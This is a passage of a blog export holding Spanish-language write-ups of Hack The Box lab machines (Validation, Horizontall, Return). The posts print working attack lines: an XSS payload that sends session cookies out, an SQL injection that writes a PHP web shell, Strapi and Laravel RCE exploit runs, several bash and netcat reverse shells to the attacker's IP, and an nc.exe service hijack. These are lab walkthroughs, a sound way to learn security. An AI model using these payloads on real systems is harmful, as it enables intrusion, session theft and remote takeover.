nginx\n|_http-title: 403 Forbidden\n8080/tcp open  http    nginx\n|_http-title: 502 Bad Gateway\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nEl puerto 8080 devuelve un http status code 502 y el 4566 un 403 forbidden, por lo que nos centramos en el puerto 80.\n\nEn la página principal aparece un formulario donde podemos introducir un nombre y elegir un país.\n\nParece que al rellenarlo, nos lleva a otra página con la información registrada. Probamos una inyección XSS en el campo Username y avanzamos.\n\n<script>alert(\"XSS attack\");</script>\n\nPulsamos al botón de Join Now y encontramos lo siguiente.\n\nUna vez que validamos que es vulnerable a ataques XSS, busco el siguiente código en el cheatsheet de R0B1NL1N.\n\n<script>var i=new Image;i.src=\"http://10.10.14.14:8080/?\"+document.cookie;</script>\n\nY tras poner en escucha en nuestro equipo un servidor en el puerto 8080, recibo la siguiente petición. Lo que se ve a continuación soy yo entrando a la página y enviándome mi cookie de sesión user=020fba18d39d4e3bbda3fa8396dd4563. De esta forma verifico que todo funciona correctamente.\n\n❯ python -m http.server 8080\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n10.10.14.14 - - [08/Feb/2022 18:39:45] \"GET /?user=020fba18d39d4e3bbda3fa8396dd4563 HTTP/1.1\" 200 -\n\nLlegados a este punto cualquier usuario que entre a esa página, nos estará enviando su cookie de sesión. Continúo buscando cosas mientras dejo el servidor corriendo aunque ya os adelanto que por ese camino, no voy a conseguir nada más.\n\nRetomando los pasos previos, intento ver si el formulario es vulnerable a injecciones SQL y veo que el input del país es vulnerable.\n\nMonto Burpsuite, activo el proxy en mi navegador y modifico los parámetros de la petición /POST de la siguiente manera.\n\nusername=anyuser&country='union select \"<?php system($_REQUEST['cmd']); ?>\" INTO OUTFILE \"/var/www/html/shell.php\"-- -\n\nMe pongo en escucha con Netcat en mi máquina en el puerto 443 y realizo una petición a la siguiente URL.\n\nhttp://10.10.11.116/shell.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.14%2F443%200%3E%261%0A\n\nLa URL está codificada. El contenido de cmd es bash -i >& /dev/tcp/10.10.14.14/443 0>&1.\n\nRecibo la shell y lo primero que hago es ver la siguiente configuración en el directorio actual.\n\nwww-data@validation:/var/www/html$ cat config.php\n<?php\n  $servername = \"127.0.0.1\";\n  $username = \"uhc\";\n  $password = \"uhc-9qual-global-pw\";\n  $dbname = \"registration\";\n\n  $conn = new mysqli($servername, $username, $password, $dbname);\n?>\n\nVeo las credenciales de MySQL. Podría tratar de enumerar el contenido de la base de datos, pero pruebo por casualidad si soy capaz de ponerme como sudo con la misma contraseña.\n\nwww-data@validation: su -\nuhc-9qual-global-pw\nroot@validation:~#\n\nLlegados a este punto, tenemos acceso a todo el contenido. Enumero las flags y listo.\n\nroot@validation:~# cat /home/htb/user.txt\ne4be632da67c582f555571fdfa8135d6\nroot@validation:~# cat root.txt\n459129eac316e8f9a522758f2a362493",
            "feature_image": "__GHOST_URL__/content/images/2022/02/validation.png",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-02-08T17:34:43.000Z",
            "updated_at": "2022-02-09T16:47:56.000Z",
            "published_at": "2022-02-09T16:47:56.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63a223c1005753014811237a",
            "uuid": "6928e15b-661f-45f1-b4fc-53c86bcd8fa6",
            "title": "CTF - Horizontall WriteUp",
            "slug": "ctf-horizontall",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"language\":\"bash\",\"code\":\"nmap -p- -sS -T5 --open -vvv 10.10.11.105 -oG allPorts\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image.png\",\"width\":836,\"height\":436}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/Screenshot_2-1.png\",\"width\":789,\"height\":413}],[\"code\",{\"language\":\"bash\",\"code\":\"❯ cat /etc/hosts\\n───────┬─────────────────────────────────────────────────────────────────────\\n       │ File: /etc/hosts\\n───────┼─────────────────────────────────────────────────────────────────────\\n   1   │ # Host addresses\\n   2   │ 127.0.0.1  localhost\\n   3   │ 127.0.1.1  iocio-virtualbox\\n   4   │ ::1        localhost ip6-localhost ip6-loopback\\n   5   │ ff02::1    ip6-allnodes\\n   6   │ ff02::2    ip6-allrouters\\n   7   │ \\n   8   │ 10.10.11.105    horizontall.htb www.horizontall.htb api-prod.horizontall.htb\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \\\"http://api-prod.horizontall.htb/FUZZ\\\"\\n********************************************************\\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\\n********************************************************\\nTarget: http://api-prod.horizontall.htb/FUZZ\\nTotal requests: 141708\\n=====================================================================\\nID           Response   Lines    Word       Chars       Payload               \\n=====================================================================    \\n000000014:   200        19 L     33 W       413 Ch      \\\"http://api-prod.horizontall.htb/\\\"\\n000000350:   200        0 L      21 W       507 Ch      \\\"reviews\\\"             \\n000001895:   200        16 L     101 W      854 Ch      \\\"admin\\\"               \"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-3.png\",\"width\":478,\"height\":405}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-5.png\",\"width\":404,\"height\":186}],[\"code\",{\"language\":\"bash\",\"code\":\"❯ python3 password.py\\n[*] strapi version: 3.0.0-beta.17.4\\n[*] Password reset for user: admin@horizontall.htb\\n[*] Setting new password\\n[+] New password 'admin' set for user admin@horizontall.htb\"}],[\"code\",{\"language\":\"bash\",\"code\":\"nc -lvp 443\"}],[\"code\",{\"language\":\"bash\",\"code\":\"python3 rce.py http://api-prod.horizontall.htb\\n[+] Checking Strapi CMS Version running\\n[+] Seems like the exploit will work!!!\\n[+] Executing exploit\\n\\n$> bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'\"}],[\"code\",{\"language\":\"bash\",\"code\":\"strapi@horizontall:~$ whoami\\nstrapi\\nstrapi@horizontall:~$ id\\nuid=1001(strapi) gid=1001(strapi) groups=1001(strapi)\"}],[\"code\",{\"language\":\"bash\",\"code\":\"strapi@horizontall:~$ netstat -tulpn\\nProto Recv-Q Send-Q Local Address           Foreign Address         State    \\ntcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN  \\n...\"}],[\"code\",{\"language\":\"bash\",\"code\":\"ssh -L 80:127.0.0.1:8000 -i strapi_id_rsa strapi@10.10.11.105\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-6.png\",\"width\":868,\"height\":655}],[\"code\",{\"language\":\"bash\",\"code\":\"python3 laravel.py http://127.0.0.1:80 /home/developer/myproject/storage/logs/laravel.log 'whoami'\\nExploit...\\nroot\"}],[\"code\",{\"language\":\"bash\",\"code\":\"nc -lvp 443\"}],[\"code\",{\"language\":\"bash\",\"code\":\"python3 laravel.py http://127.0.0.1:80 /home/developer/myproject/storage/logs/laravel.log 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 443 >/tmp/f'\"}],[\"code\",{\"language\":\"bash\",\"code\":\"❯ nc -lvp 443\\nlistening on [any] 443 ...\\nconnect to [10.10.14.15] from horizontall.htb [10.10.11.105] 38560\\n# whoami\\nroot\\n# cat /root/root.txt\\n7360xxxxxxxxxxxxxxxxxxx\\n\"}]],\"markups\":[[\"a\",[\"href\",\"https://www.exploit-db.com/exploits/50237\"]],[\"em\"],[\"strong\"],[\"a\",[\"href\",\"https://www.exploit-db.com/exploits/50239\"]],[\"a\",[\"href\",\"https://www.exploit-db.com/exploits/49424\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Hago un escaneo de puertos todos los puertos disponibles con NMAP.\"]]],[10,0],[1,\"p\",[[0,[],0,\"Me devuelve los puertos 80 y 22 como abiertos y abro en un navegador la siguiente url http://10.10.11.105.\"]]],[10,1],[1,\"p\",[[0,[],0,\"Percibo que me encuentro ante una SPA hecha en VueJS. En un inicio, el código fuente de la web está oculto puesto que se carga posteriormente cuando el navegador interpreta Javascript. Utilizando el devtools de Firefox, encuentro los archivos Vue que llaman a la API para recuperar la información.\"]]],[10,2],[1,\"p\",[[0,[],0,\"El subdominio que aparece reflejado lo introduzco en mi /etc/hosts con el fin de poder resolver dicha dirección en caso de encontrarme con un virtual hosting.\"]]],[10,3],[1,\"p\",[[0,[],0,\"Realizo fuzzing contra el dominio api-prod.horizontall.htb.\"]]],[10,4],[1,\"p\",[[0,[],0,\"Encuentro una ruta interesante en /admin. En ella, aparece un formulario de login de una plataforma denominada Strapi.\"]]],[10,5],[1,\"p\",[[0,[],0,\"Buscando un poco encuentro la siguiente \"],[0,[0],1,\"vulnerabilidad\"],[0,[],0,\" que nos permite resetear la contraseña del usuario. Analizando el script, veo que accediendo a la ruta http://api-prod.horizontall.htb/admin/strapiVersion puedo ver la versión del CMS que está detrás. Eso me sirve para confirmar que la versión \"],[0,[1],1,\"3.0.0-beta.17.4\"],[0,[],0,\" es vulnerable. Aun así, necesito un usuario válido para poder emplear el script.\"]]],[1,\"p\",[[0,[],0,\"Si rellenamos el formulario de \\\"olvidó su contraseña\\\", observamos que hay una fuga de información que no debería existir. \"],[0,[2],1,\"Este tipo de formularios no deberían dar pistas sobre que usuarios existen o cuáles no.\"]]],[10,6],[1,\"p\",[[0,[],0,\"Probamos con admin@horizontall.htb y vemos que no pone nada, por lo que asumimos que ese usuario \"],[0,[2],1,\"SI \"],[0,[],0,\"existe.\"]]],[1,\"p\",[[0,[],0,\"Añadimos en el script los campos acordes a nuestro entorno y ejecutamos.\"]]],[10,7],[1,\"p\",[[0,[],0,\"De esta forma, hemos modificado la contraseña y podemos ejecutar otro tipo de vulnerabilidades que requieren de autenticación previa. Podemos encontrar una vulnerabilidad de ese tipo \"],[0,[3],1,\"aquí\"],[0,[],0,\". Nos ponemos en escucha en el puerto 443 con netcat. \"]]],[10,8],[1,\"p\",[[0,[],0,\"Modificamos el script para adaptarlo a nuestras necesidades y ejecutamos.\"]]],[10,9],[1,\"p\",[[0,[],0,\"De esta manera, en la consola de netcat, recibimos una reverse shell con la que podemos empezar a escalar privilegios.\"]]],[10,10],[1,\"p\",[[0,[],0,\"Verifico que puertos hay abiertos en el localhost  de la máquina por si hubiese algún servicio oculto ejecutandose.\"]]],[10,11],[1,\"p\",[[0,[],0,\"Con un curl, vemos que es una CMS de Laravel. Creamos una clave ssh para poder conectarnos a la máquina estableciendo un túnel entre mi máquina y la máquina vulnerable con tal de poder ver ese puerto oculto en su localhost.\"]]],[10,12],[10,13],[1,\"p\",[[0,[],0,\"Navegando un poco, encontramos un \"],[0,[4],1,\"exploit \"],[0,[],0,\"de la versión de Laravel que está siendo ejecutada en la máquina. Comprobamos que funciona con un 'whoami'.\"]]],[10,14],[1,\"p\",[[0,[],0,\"Una vez verificado, nos ponemos en escucha con netcat.\"]]],[10,15],[1,\"p\",[[0,[],0,\"Y nos mandamos una reverse shell con netcat versión antigua (la que tiene la máquina instalada).\"]]],[10,16],[1,\"p\",[[0,[],0,\"Recibimos la shell en nuestro equipo y terminamos con esta máquina.\"]]],[10,17],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>Hago un escaneo de puertos todos los puertos disponibles con NMAP.</p><pre><code class=\"language-bash\">nmap -p- -sS -T5 --open -vvv 10.10.11.105 -oG allPorts</code></pre><p>Me devuelve los puertos 80 y 22 como abiertos y abro en un navegador la siguiente url http://10.10.11.105.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"836\" height=\"436\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image.png 600w, __GHOST_URL__/content/images/2022/02/image.png 836w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Percibo que me encuentro ante una SPA hecha en VueJS. En un inicio, el código fuente de la web está oculto puesto que se carga posteriormente cuando el navegador interpreta Javascript. Utilizando el devtools de Firefox, encuentro los archivos Vue que llaman a la API para recuperar la información.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/Screenshot_2-1.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"789\" height=\"413\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/Screenshot_2-1.png 600w, __GHOST_URL__/content/images/2022/02/Screenshot_2-1.png 789w\" sizes=\"(min-width: 720px) 720px\"></figure><p>El subdominio que aparece reflejado lo introduzco en mi /etc/hosts con el fin de poder resolver dicha dirección en caso de encontrarme con un virtual hosting.</p><pre><code class=\"language-bash\">❯ cat /etc/hosts\n───────┬─────────────────────────────────────────────────────────────────────\n       │ File: /etc/hosts\n───────┼─────────────────────────────────────────────────────────────────────\n   1   │ # Host addresses\n   2   │ 127.0.0.1  localhost\n   3   │ 127.0.1.1  iocio-virtualbox\n   4   │ ::1        localhost ip6-localhost ip6-loopback\n   5   │ ff02::1    ip6-allnodes\n   6   │ ff02::2    ip6-allrouters\n   7   │ \n   8   │ 10.10.11.105    horizontall.htb www.horizontall.htb api-prod.horizontall.htb</code></pre><p>Realizo fuzzing contra el dominio api-prod.horizontall.htb.</p><pre><code class=\"language-bash\">&gt; wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \"http://api-prod.horizontall.htb/FUZZ\"\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\nTarget: http://api-prod.horizontall.htb/FUZZ\nTotal requests: 141708\n=====================================================================\nID           Response   Lines    Word       Chars       Payload               \n=====================================================================    \n000000014:   200        19 L     33 W       413 Ch      \"http://api-prod.horizontall.htb/\"\n000000350:   200        0 L      21 W       507 Ch      \"reviews\"             \n000001895:   200        16 L     101 W      854 Ch      \"admin\"               </code></pre><p>Encuentro una ruta interesante en /admin. En ella, aparece un formulario de login de una plataforma denominada Strapi.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-3.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"478\" height=\"405\"></figure><p>Buscando un poco encuentro la siguiente <a href=\"https://www.exploit-db.com/exploits/50237\">vulnerabilidad</a> que nos permite resetear la contraseña del usuario. Analizando el script, veo que accediendo a la ruta http://api-prod.horizontall.htb/admin/strapiVersion puedo ver la versión del CMS que está detrás. Eso me sirve para confirmar que la versión <em>3.0.0-beta.17.4</em> es vulnerable. Aun así, necesito un usuario válido para poder emplear el script.</p><p>Si rellenamos el formulario de \"olvidó su contraseña\", observamos que hay una fuga de información que no debería existir. <strong>Este tipo de formularios no deberían dar pistas sobre que usuarios existen o cuáles no.</strong></p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-5.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"404\" height=\"186\"></figure><p>Probamos con admin@horizontall.htb y vemos que no pone nada, por lo que asumimos que ese usuario <strong>SI </strong>existe.</p><p>Añadimos en el script los campos acordes a nuestro entorno y ejecutamos.</p><pre><code class=\"language-bash\">❯ python3 password.py\n[*] strapi version: 3.0.0-beta.17.4\n[*] Password reset for user: admin@horizontall.htb\n[*] Setting new password\n[+] New password 'admin' set for user admin@horizontall.htb</code></pre><p>De esta forma, hemos modificado la contraseña y podemos ejecutar otro tipo de vulnerabilidades que requieren de autenticación previa. Podemos encontrar una vulnerabilidad de ese tipo <a href=\"https://www.exploit-db.com/exploits/50239\">aquí</a>. Nos ponemos en escucha en el puerto 443 con netcat. </p><pre><code class=\"language-bash\">nc -lvp 443</code></pre><p>Modificamos el script para adaptarlo a nuestras necesidades y ejecutamos.</p><pre><code class=\"language-bash\">python3 rce.py http://api-prod.horizontall.htb\n[+] Checking Strapi CMS Version running\n[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n$&gt; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.15/443 0&gt;&amp;1'</code></pre><p>De esta manera, en la consola de netcat, recibimos una reverse shell con la que podemos empezar a escalar privilegios.</p><pre><code class=\"language-bash\">strapi@horizontall:~$ whoami\nstrapi\nstrapi@horizontall:~$ id\nuid=1001(strapi) gid=1001(strapi) groups=1001(strapi)</code></pre><p>Verifico que puertos hay abiertos en el localhost  de la máquina por si hubiese algún servicio oculto ejecutandose.</p><pre><code class=\"language-bash\">strapi@horizontall:~$ netstat -tulpn\nProto Recv-Q Send-Q Local Address           Foreign Address         State    \ntcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN  \n...</code></pre><p>Con un curl, vemos que es una CMS de Laravel. Creamos una clave ssh para poder conectarnos a la máquina estableciendo un túnel entre mi máquina y la máquina vulnerable con tal de poder ver ese puerto oculto en su localhost.</p><pre><code class=\"language-bash\">ssh -L 80:127.0.0.1:8000 -i strapi_id_rsa strapi@10.10.11.105</code></pre><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-6.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"868\" height=\"655\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-6.png 600w, __GHOST_URL__/content/images/2022/02/image-6.png 868w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Navegando un poco, encontramos un <a href=\"https://www.exploit-db.com/exploits/49424\">exploit </a>de la versión de Laravel que está siendo ejecutada en la máquina. Comprobamos que funciona con un 'whoami'.</p><pre><code class=\"language-bash\">python3 laravel.py http://127.0.0.1:80 /home/developer/myproject/storage/logs/laravel.log 'whoami'\nExploit...\nroot</code></pre><p>Una vez verificado, nos ponemos en escucha con netcat.</p><pre><code class=\"language-bash\">nc -lvp 443</code></pre><p>Y nos mandamos una reverse shell con netcat versión antigua (la que tiene la máquina instalada).</p><pre><code class=\"language-bash\">python3 laravel.py http://127.0.0.1:80 /home/developer/myproject/storage/logs/laravel.log 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.15 443 &gt;/tmp/f'</code></pre><p>Recibimos la shell en nuestro equipo y terminamos con esta máquina.</p><pre><code class=\"language-bash\">❯ nc -lvp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.15] from horizontall.htb [10.10.11.105] 38560\n# whoami\nroot\n# cat /root/root.txt\n7360xxxxxxxxxxxxxxxxxxx\n</code></pre>",
            "comment_id": "6203f4ca5a95d40061bbb791",
            "plaintext": "Hago un escaneo de puertos todos los puertos disponibles con NMAP.\n\nnmap -p- -sS -T5 --open -vvv 10.10.11.105 -oG allPorts\n\nMe devuelve los puertos 80 y 22 como abiertos y abro en un navegador la siguiente url http://10.10.11.105.\n\nPercibo que me encuentro ante una SPA hecha en VueJS. En un inicio, el código fuente de la web está oculto puesto que se carga posteriormente cuando el navegador interpreta Javascript. Utilizando el devtools de Firefox, encuentro los archivos Vue que llaman a la API para recuperar la información.\n\nEl subdominio que aparece reflejado lo introduzco en mi /etc/hosts con el fin de poder resolver dicha dirección en caso de encontrarme con un virtual hosting.\n\n❯ cat /etc/hosts\n───────┬─────────────────────────────────────────────────────────────────────\n       │ File: /etc/hosts\n───────┼─────────────────────────────────────────────────────────────────────\n   1   │ # Host addresses\n   2   │ 127.0.0.1  localhost\n   3   │ 127.0.1.1  iocio-virtualbox\n   4   │ ::1        localhost ip6-localhost ip6-loopback\n   5   │ ff02::1    ip6-allnodes\n   6   │ ff02::2    ip6-allrouters\n   7   │ \n   8   │ 10.10.11.105    horizontall.htb www.horizontall.htb api-prod.horizontall.htb\n\nRealizo fuzzing contra el dominio api-prod.horizontall.htb.\n\n> wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \"http://api-prod.horizontall.htb/FUZZ\"\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\nTarget: http://api-prod.horizontall.htb/FUZZ\nTotal requests: 141708\n=====================================================================\nID           Response   Lines    Word       Chars       Payload               \n=====================================================================    \n000000014:   200        19 L     33 W       413 Ch      \"http://api-prod.horizontall.htb/\"\n000000350:   200        0 L      21 W       507 Ch      \"reviews\"             \n000001895:   200        16 L     101 W      854 Ch      \"admin\"               \n\nEncuentro una ruta interesante en /admin. En ella, aparece un formulario de login de una plataforma denominada Strapi.\n\nBuscando un poco encuentro la siguiente vulnerabilidad que nos permite resetear la contraseña del usuario. Analizando el script, veo que accediendo a la ruta http://api-prod.horizontall.htb/admin/strapiVersion puedo ver la versión del CMS que está detrás. Eso me sirve para confirmar que la versión 3.0.0-beta.17.4 es vulnerable. Aun así, necesito un usuario válido para poder emplear el script.\n\nSi rellenamos el formulario de \"olvidó su contraseña\", observamos que hay una fuga de información que no debería existir. Este tipo de formularios no deberían dar pistas sobre que usuarios existen o cuáles no.\n\nProbamos con admin@horizontall.htb y vemos que no pone nada, por lo que asumimos que ese usuario SI existe.\n\nAñadimos en el script los campos acordes a nuestro entorno y ejecutamos.\n\n❯ python3 password.py\n[*] strapi version: 3.0.0-beta.17.4\n[*] Password reset for user: admin@horizontall.htb\n[*] Setting new password\n[+] New password 'admin' set for user admin@horizontall.htb\n\nDe esta forma, hemos modificado la contraseña y podemos ejecutar otro tipo de vulnerabilidades que requieren de autenticación previa. Podemos encontrar una vulnerabilidad de ese tipo aquí. Nos ponemos en escucha en el puerto 443 con netcat.\n\nnc -lvp 443\n\nModificamos el script para adaptarlo a nuestras necesidades y ejecutamos.\n\npython3 rce.py http://api-prod.horizontall.htb\n[+] Checking Strapi CMS Version running\n[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n$> bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'\n\nDe esta manera, en la consola de netcat, recibimos una reverse shell con la que podemos empezar a escalar privilegios.\n\nstrapi@horizontall:~$ whoami\nstrapi\nstrapi@horizontall:~$ id\nuid=1001(strapi) gid=1001(strapi) groups=1001(strapi)\n\nVerifico que puertos hay abiertos en el localhost  de la máquina por si hubiese algún servicio oculto ejecutandose.\n\nstrapi@horizontall:~$ netstat -tulpn\nProto Recv-Q Send-Q Local Address           Foreign Address         State    \ntcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN  \n...\n\nCon un curl, vemos que es una CMS de Laravel. Creamos una clave ssh para poder conectarnos a la máquina estableciendo un túnel entre mi máquina y la máquina vulnerable con tal de poder ver ese puerto oculto en su localhost.\n\nssh -L 80:127.0.0.1:8000 -i strapi_id_rsa strapi@10.10.11.105\n\nNavegando un poco, encontramos un exploit de la versión de Laravel que está siendo ejecutada en la máquina. Comprobamos que funciona con un 'whoami'.\n\npython3 laravel.py http://127.0.0.1:80 /home/developer/myproject/storage/logs/laravel.log 'whoami'\nExploit...\nroot\n\nUna vez verificado, nos ponemos en escucha con netcat.\n\nnc -lvp 443\n\nY nos mandamos una reverse shell con netcat versión antigua (la que tiene la máquina instalada).\n\npython3 laravel.py http://127.0.0.1:80 /home/developer/myproject/storage/logs/laravel.log 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 443 >/tmp/f'\n\nRecibimos la shell en nuestro equipo y terminamos con esta máquina.\n\n❯ nc -lvp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.15] from horizontall.htb [10.10.11.105] 38560\n# whoami\nroot\n# cat /root/root.txt\n7360xxxxxxxxxxxxxxxxxxx\n",
            "feature_image": "__GHOST_URL__/content/images/2022/02/Screenshot_1-1.png",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-02-09T17:07:22.000Z",
            "updated_at": "2022-12-30T23:23:56.000Z",
            "published_at": "2022-02-17T05:48:04.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63a223c1005753014811237b",
            "uuid": "1c2947b7-5a82-45c0-a195-1479a42749fa",
            "title": "CTF - Return WriteUp",
            "slug": "ctf-return",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"language\":\"sh\",\"code\":\"❯ ping 10.10.11.108 -c 1\\nPING 10.10.11.108 (10.10.11.108) 56(124) bytes of data.\\n64 bytes from 10.10.11.108: icmp_seq=1 ttl=127 time=43.2 ms\"}],[\"code\",{\"language\":\"sh\",\"code\":\"nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49694,59851 -sCV -v 10.10.11.108 -oN targeted\\nPORT      STATE SERVICE       VERSION\\n80/tcp    open  http          Microsoft IIS httpd 10.0\\n| http-methods: \\n|   Supported Methods: OPTIONS TRACE GET HEAD POST\\n|_  Potentially risky methods: TRACE\\n|_http-server-header: Microsoft-IIS/10.0\\n|_http-title: HTB Printer Admin Panel\\n135/tcp   open  msrpc         Microsoft Windows RPC\\n...\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-7.png\",\"width\":616,\"height\":319}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ nc -lvp 389\\nlistening on [any] 389 ...\\n10.10.11.108: inverse host lookup failed: Unknown host\\nconnect to [10.10.14.21] from (UNKNOWN) [10.10.11.108] 59872\\n0*`%return\\\\svc-printer�\\n                       1edFg43012!!\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'\\nEvil-WinRM shell v3.3\\nInfo: Establishing connection to remote endpoint\\n\\n*Evil-WinRM* PS C:\\\\Users\\\\svc-printer\\\\Documents> whoami\\nreturn\\\\svc-printer\"}],[\"code\",{\"language\":\"sh\",\"code\":\"*Evil-WinRM* PS C:\\\\Users\\\\svc-printer\\\\documents> cat ../desktop/user.txt\\n6df0ae750542xxxxxxxxxxxxxxxxxxx \"}],[\"code\",{\"language\":\"sh\",\"code\":\"*Evil-WinRM* PS C:\\\\Users\\\\svc-printer\\\\Desktop> whoami /priv\\nPRIVILEGES INFORMATION\\n----------------------\\nPrivilege Name                Description                         State\\n============================= =================================== =======\\nSeMachineAccountPrivilege     Add workstations to domain          Enabled\\nSeLoadDriverPrivilege         Load and unload device drivers      Enabled\\nSeSystemtimePrivilege         Change the system time              Enabled\\nSeBackupPrivilege             Back up files and directories       Enabled\\nSeRestorePrivilege            Restore files and directories       Enabled\\nSeShutdownPrivilege           Shut down the system                Enabled\\nSeChangeNotifyPrivilege       Bypass traverse checking            Enabled\\nSeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled\\nSeIncreaseWorkingSetPrivilege Increase a process working set      Enabled\\nSeTimeZonePrivilege           Change the time zone                Enabled\"}],[\"code\",{\"language\":\"sh\",\"code\":\"*Evil-WinRM* PS C:\\\\Users\\\\svc-printer\\\\Desktop> net user svc-printer\\n...\\nLocal Group Memberships      *Print Operators      *Remote Management Use\\n                             *Server Operators\\nGlobal Group memberships     *Domain Users\\nThe command completed successfully.\"}],[\"code\",{\"language\":\"sh\",\"code\":\"*Evil-WinRM* PS C:\\\\Users\\\\svc-printer\\\\Desktop> upload /home/iocio/Desktop/iocio/HTB/Return/content/nc.exe\"}],[\"code\",{\"language\":\"sh\",\"code\":\"*Evil-WinRM* PS C:\\\\Users\\\\svc-printer\\\\Desktop> sc.exe create reverse binPath=\\\"C:\\\\Users\\\\svc-printer\\\\Desktop\\\\nc.exe -e cmd 10.10.14.21 443\\\"\\n[SC] OpenSCManager FAILED 5:\\nAccess is denied.\"}],[\"code\",{\"language\":\"sh\",\"code\":\"*Evil-WinRM* PS C:\\\\Users\\\\svc-printer\\\\documents> services\\nPath                                                                                                                 Privileges Service          \\n----                                                                                                                 ---------- -------          \\nC:\\\\Windows\\\\ADWS\\\\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             \\n\\\\??\\\\C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Definition Updates\\\\{5533AFC7-64B3-4F6E-B453-E35320B35716}\\\\MpKslDrv.sys       True MpKslceeb2796    \\nC:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\SMSvcHost.exe                                                              True NetTcpPortSharing\\nC:\\\\Windows\\\\SysWow64\\\\perfhost.exe                                                                                           True PerfHost         \\n\\\"C:\\\\Program Files\\\\Windows Defender Advanced Threat Protection\\\\MsSense.exe\\\"                                                False Sense            \\nC:\\\\Windows\\\\servicing\\\\TrustedInstaller.exe                                                                                 False TrustedInstaller \\n\\\"C:\\\\Program Files\\\\VMware\\\\VMware Tools\\\\VMware VGAuth\\\\VGAuthService.exe\\\"                                                     True VGAuthService    \\n\\\"C:\\\\Program Files\\\\VMware\\\\VMware Tools\\\\vmtoolsd.exe\\\"                                                                        True VMTools          \\n\\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\platform\\\\4.18.2104.14-0\\\\NisSrv.exe\\\"                                             True WdNisSvc         \\n\\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\platform\\\\4.18.2104.14-0\\\\MsMpEng.exe\\\"                                            True WinDefend        \\n\\\"C:\\\\Program Files\\\\Windows Media Player\\\\wmpnetwk.exe\\\"                                                                      False WMPNetworkSvc\"}],[\"code\",{\"language\":\"sh\",\"code\":\"*Evil-WinRM* PS C:\\\\Users\\\\svc-printer\\\\Desktop> sc.exe config VMTools 